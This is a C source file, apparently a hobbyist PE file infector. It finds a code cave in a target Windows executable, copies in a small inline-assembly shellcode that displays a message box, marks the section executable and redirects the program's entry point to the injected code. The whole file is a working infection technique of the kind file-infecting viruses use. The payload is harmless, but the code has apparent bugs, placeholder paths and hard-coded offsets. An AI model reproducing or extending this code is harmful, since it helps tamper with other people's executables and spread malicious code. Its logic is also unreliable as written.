#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <memoryapi.h>
#define db(x) __asm _emit x
#pragma runtime_checks("", off)

__declspec(naked) void ShellcodeStart(VOID) {
    __asm {
        pushad  // preserve our thread context
        call GetBasePointer
        GetBasePointer :
        pop ebp
            sub ebp, offset GetBasePointer // delta offset trick. Think relative...

            push MB_OK
            lea  eax, [ebp + szTitle]
            push eax
            lea  eax, [ebp + szText]
            push eax
            push 0
            mov  eax, 0xAAAAAAAA
            call eax
            mov eax, [0x00411023]
        start:
            cmp eax, 0xE9A81100
            je finish
            inc eax

        finish:
            popad   // restore our thread context
            push eax // push address of orignal entrypoint(place holder)
            retn    // retn used as jmp

            szText :
            db('H') db('i') db(0)
            szTitle :
            db ('i') db('t') db('s') db(' ')db('s') db('o') db('l') db('i') db('d') db('i') db('t') db('y') db('G') db('u') db('y') db(0)
    }
}

VOID ShellcodeEnd() {

}

PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
    return (PIMAGE_DOS_HEADER)file;
}

PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
    PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

    return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
}

PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
}

PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_OPTIONAL_HEADER)&pinh->OptionalHeader;
}


//returns the first section's header
//AKA .text or the code section

PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

    return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
    return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
    return pidh->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
    return pinh->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <TARGET FILE>\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
    DWORD dwFileSize = GetFileSize(hFile, NULL);
 
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
    if (hMapping == NULL) {
        fprintf(stderr, "Error: hMapping");
        return 1;
    }
    LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);

    // check if valid pe file
    if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
        VerifyPE(GetPeHeader(lpFile)) == FALSE) {
        fprintf(stderr, "Not a valid PE file\n");
        return 1;
    }

    PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
    PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);
    // get original entry point
    DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
        pinh->OptionalHeader.ImageBase;

    DWORD dwShellcodeSize = 74;
    printf("Size of my function: %d", dwShellcodeSize);
    // find code cave
    DWORD dwCount = 0;
    DWORD dwPosition = 0;
    for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
        if (*(lpFile + dwPosition) == 0x00) {
            if (dwCount++ == dwShellcodeSize + 34) {
                // backtrack to the beginning of the code cave
                printf("Found code cave\n");
                dwPosition -= dwShellcodeSize;
                break;
            }
        }
        else {
            // reset counter if failed to find large enough cave
            dwCount = 0;
        }
    }
    printf("Position: %d\n", dwPosition);
    // if failed to find suitable code cave
    if (dwCount == 0 || dwPosition == 0) {
        printf("Failed to find code cave\n");
        return 1;
    }
    
    // dynamically obtain address of function
    HMODULE hModule = LoadLibraryA("user32.dll");

    LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
    printf("\nFunction addy: %0.8x\n", (DWORD)lpAddress);
    printf("OEP: %0.8x\n", dwOEP);
    printf("Image Base: %0.8x\n", (DWORD)pinh->OptionalHeader.ImageBase);
    DWORD shiet = (DWORD)main;

    // create buffer for shellcode
    HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);

    LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
    
    HANDLE hFile2 = CreateFileA("C:\\Users\\USERNAME\\source\\repos\\myprogram\\Debug\\myprogram2.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwFileSize2 = GetFileSize(hFile2, NULL);
    HANDLE hMapping2 = CreateFileMappingW(hFile2, NULL, PAGE_READWRITE, 0, dwFileSize2, NULL);
    if (hMapping2 == NULL) {
        fprintf(stderr, "Error: hMapping");
        return 1;
    }
    LPBYTE lpFile2 = (LPBYTE)MapViewOfFile(hMapping2, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize2);

    PIMAGE_DOS_HEADER dosHeader = GetDosHeader(lpFile2);

    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
    {
        //pointer to PE/NT header
        PIMAGE_NT_HEADERS peHeader = (PIMAGE_NT_HEADERS)((u_char*)dosHeader + dosHeader->e_lfanew);

        if (peHeader->Signature == IMAGE_NT_SIGNATURE)
        {
            printf("\n PE Signature (PE) Matched \n");

            DWORD ptr = 0x119a0;

            PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(peHeader); //first section address
            UINT nSectionCount = peHeader->FileHeader.NumberOfSections;
            UINT i = 0;
            //check in which section the address belongs
            for (i = 0; i <= nSectionCount; ++i, ++sectionHeader)
            {
                if ((sectionHeader->VirtualAddress) > ptr)
                {
                    sectionHeader--;
                    break;
                }
            }

            //once the correct section is found below formula gives the actual disk offset 
            DWORD retAddr = sectionHeader->PointerToRawData + (ptr - sectionHeader->VirtualAddress);
            printf("\n Disk Offset : %x \n", retAddr);
            // retAddr+(PBYTE)lpFileBase contains the actual disk offset of address of entry point
        }
        UnmapViewOfFile(hMapping2);
        CloseHandle(hFile2);
    }
    // Opens the copy of your target program, seeks the location of the function and reads the shellcode bytes.
    FILE* findFunc = fopen("C:\\Users\\USERNAME\\source\\repos\\myprogram\\Debug\\myprogram2.exe", "rb");
    
    // Change 3488 for the file offset you found using pdbreader.
    fseek(findFunc, 3488, SEEK_SET);

    fread(lpHeap, 1, dwShellcodeSize, findFunc);
 
    fclose(findFunc);
    
    // modify function address offset
    DWORD dwIncrementor = 0;
    for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
            // insert function's address
            *((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
            FreeLibrary(hModule);
            printf("Worked\n");
            break;
        }
    }
    
    // modify OEP address offset
    for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
            // insert OEP
            *((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
            printf("Worked\n");
            break;
        }
    }
   
    // copy the shellcode into code cave
    memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
    HeapFree(hHeap, 0, lpHeap);
    HeapDestroy(hHeap);
    printf("Virtual size 1: %d\n", pish->Misc.VirtualSize);
    // update PE file information
    pish->Misc.VirtualSize += dwShellcodeSize;
    printf("Virtual size 2: %d\n", pish->Misc.VirtualSize);
    // make section executable
    pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    // set entry point
    // RVA = file offset + virtual offset - raw offset
    pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
   
    return 0;

}
